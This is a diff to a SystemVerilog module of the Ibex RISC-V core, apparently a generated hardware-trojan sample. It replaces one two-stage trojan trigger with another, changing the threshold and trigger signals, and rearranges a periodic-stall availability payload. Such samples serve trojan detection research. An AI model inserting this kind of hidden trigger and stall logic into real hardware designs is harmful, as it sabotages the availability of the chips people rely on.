@@ -30,27 +30,6 @@ module ibex_dummy_instr_trojan_Availability import ibex_pkg::*; #(
   output logic [31:0] dummy_instr_data_o
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 6527;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|fetch_valid_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && fetch_valid_i) trojan_active <= 1'b1;
-        end
-    end
-
-
   localparam int unsigned TIMEOUT_CNT_W = 5;
   localparam int unsigned OP_W          = 5;
 
@@ -68,6 +47,29 @@ module ibex_dummy_instr_trojan_Availability import ibex_pkg::*; #(
     logic [TIMEOUT_CNT_W-1:0] cnt;
   } lfsr_data_t;
   localparam int unsigned LFSR_OUT_W = $bits(lfsr_data_t);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=8630)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8630;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|dummy_instr_seed_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+
 
   lfsr_data_t               lfsr_data;
   logic [TIMEOUT_CNT_W-1:0] dummy_cnt_incr, dummy_cnt_threshold;
@@ -169,12 +171,9 @@ module ibex_dummy_instr_trojan_Availability import ibex_pkg::*; #(
   assign dummy_instr_data_o   = dummy_instr;
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             stall_counter <= '0;
@@ -188,5 +187,6 @@ module ibex_dummy_instr_trojan_Availability import ibex_pkg::*; #(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
